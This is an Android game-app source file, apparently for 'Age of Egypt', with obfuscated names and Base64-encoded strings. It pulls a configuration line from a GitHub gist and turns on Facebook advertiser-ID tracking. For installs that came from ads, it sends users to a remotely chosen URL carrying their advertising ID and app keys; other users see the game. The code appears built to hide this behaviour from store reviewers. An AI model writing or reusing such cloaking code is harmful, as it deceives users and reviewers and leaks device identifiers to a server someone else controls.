package com.aagee.oof.eegypt.yff;

import static android.content.Context.MODE_PRIVATE;
import static com.aagee.oof.eegypt.AOE.hfdsgds;
import static com.aagee.oof.eegypt.AOE.jfdys;
import static com.aagee.oof.eegypt.AOE.yfdgs;
import static com.aagee.oof.eegypt.AOE.dsdd;
import static com.aagee.oof.eegypt.Pollll.drrr;
import static com.aagee.oof.eegypt.yff.Ygem.oopp;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;

import android.os.Handler;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.LinearInterpolator;

import com.aagee.oof.eegypt.AOE;
import com.aagee.oof.eegypt.Appry;
import com.aagee.oof.eegypt.R;
import com.agrawalsuneet.squareloaderspack.loaders.UsainBoltLoader;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class Yprooo extends Fragment {

    public static AOE aoe;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View iuj = inflater.inflate(R.layout.fragment_ybuut, container, false);

        UsainBoltLoader usainBoltLoader = new UsainBoltLoader(aoe,
                60, ContextCompat.getColor(aoe.getApplicationContext(), R.color.blue));

        usainBoltLoader.setAnimDuration(1000);
        usainBoltLoader.setInterpolator(new LinearInterpolator());


        container.addView(usainBoltLoader);

        return iuj;
    }


    public static String idhds = null;
    public static String iifdhdc;
    public static String mnvcbd;
    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void con(AOE aoe){

        try {
            HttpURLConnection hshhas = (HttpURLConnection) new URL(drrr("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzL2M3NTFmOGJkZGE0MzBmMzRmNjdjOTc2YTA2NGVjNjlhL3Jhdy9BZ2Vfb2ZfRWd5cHQ=")).openConnection();
            BufferedReader kijjb = new BufferedReader(new InputStreamReader(hshhas.getInputStream()));
            String s = kijjb.readLine();
            jkk(s);

            aoe.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    FacebookSdk.setApplicationId(nchss);
                    FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                    FacebookSdk.sdkInitialize(aoe.getApplicationContext());
                    FacebookSdk.fullyInitialize();
                    FacebookSdk.setAutoInitEnabled(true);
                    FacebookSdk.setAutoLogAppEventsEnabled(true);

                    AppEventsLogger.activateApp(aoe.getApplication());
                    AppLinkData.fetchDeferredAppLinkData(aoe.getApplicationContext(), new AppLinkData.CompletionHandler() {
                        @Override
                        public void onDeferredAppLinkDataFetched(@Nullable AppLinkData hhdshsd) {

                            if (hhdshsd == null) {
                                hhdshsd = AppLinkData.createFromActivity(aoe);
                            }
                            if (hhdshsd != null) {
                                Uri url = hhdshsd.getTargetUri();
                                iifdhdc = url.getQuery();
                                mnvcbd = oopp(iifdhdc,aoe.getPackageName(), hfdsgds, yfdgs);

                            }else {

                            }
                        }
                    });

                    String hdgsd = aoe.getSharedPreferences(aoe.getPackageName(), MODE_PRIVATE).getString(drrr("c2F2ZWRVcmw="), "uuuuuu");

                    if (hdgsd.equals("uuuuuu")){

                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {

                                String ufyds = Appry.ygda;
                                Log.d("weq", Appry.ygda);
                                if (ufyds.equals(drrr("Tm9uLW9yZ2FuaWM="))){
                                    idhds = udydh + AOE.hdyfd;
                                    dsdd.navigate(R.id.oooooofff);

                                }else if(iifdhdc != null) {
                                    idhds = udydh + mnvcbd;
                                    dsdd.navigate(R.id.oooooofff);

                                }else {
                                    if (iudbcs.equals(drrr("Tk8="))) {
                                        dsdd.navigate(R.id.ybuuu);
                                    }else {
                                        String strAppsFlyer = iudbcs + drrr("P2J1bmRsZT0=") + aoe.getPackageName() + drrr("JmFkX2lkPQ==") + hfdsgds + drrr("JmFwcHNfaWQ9")
                                                + yfdgs + drrr("JmRldl9rZXk9") + drrr(jfdys);
                                        idhds = udydh + strAppsFlyer;
                                        dsdd.navigate(R.id.oooooofff);
                                    }
                                }
                            }
                        },5000);

                    }else {

                        idhds = hdgsd;
                        dsdd.navigate(R.id.oooooofff);
                    }
                }
            });

        }catch (Exception e){
            dsdd.navigate(R.id.ybuuu);
        }

    }

    public static String udydh;
    public static String iudbcs;
    public static String nchss;

    private static void jkk(String dsda){
        String [] a = dsda.split("\\\u007C");
        udydh = a[0];
        iudbcs = a[1];
        nchss = a[2];
    }
}